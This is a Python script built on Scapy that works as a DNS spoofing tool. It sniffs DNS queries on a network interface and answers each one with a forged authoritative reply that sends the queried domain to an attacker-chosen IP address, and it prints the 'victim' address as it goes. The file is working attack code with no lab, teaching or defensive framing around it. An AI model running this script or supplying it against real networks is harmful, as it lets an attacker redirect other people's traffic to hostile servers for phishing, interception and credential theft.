from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff

def spoof_dns_packet(pkt, fake_ip, iface):
    print("\n[>] Intercepted packet...")

    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        try:
            queried_domain = pkt[DNSQR].qname.decode().strip(".")
            victim_ip = pkt[IP].src
            dns_id = pkt[DNS].id
            print("[*] DNS query from {} for domain: {}".format(victim_ip, queried_domain))

            # Debug: Show original DNS packet summary
            pkt.show()

            # Build spoofed DNS response
            ip = IP(src=pkt[IP].dst, dst=victim_ip)
            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            dns = DNS(
                id=dns_id,
                qr=1,       # Response
                aa=1,       # Authoritative
                ra=1,       # Recursion available
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)
            )

            spoofed_response = ip / udp / dns
            spoofed_response = spoofed_response.__class__(bytes(spoofed_response))

            print("[+] Sending spoofed response with:")
            print("    - DNS ID: {}".format(dns_id))
            print("    - Spoofed IP: {}".format(fake_ip))
            print("    - Destination IP: {}".format(victim_ip))
            spoofed_response.show()

            send(spoofed_response, iface=iface, verbose=True)
            print("[+] Spoofed DNS response sent successfully.")

        except Exception as e:
            print("[!] Error: {}".format(e))
            pkt.show()

def start_dns_spoofer(fake_ip, iface):
    print("[*] Starting DNS spoofing (ALL domains)...")
    print("[*] Responding with fake IP: {}".format(fake_ip))
    print("[*] Listening on interface: {}\n".format(iface))

    try:
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=lambda pkt: spoof_dns_packet(pkt, fake_ip, iface),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped by user.")
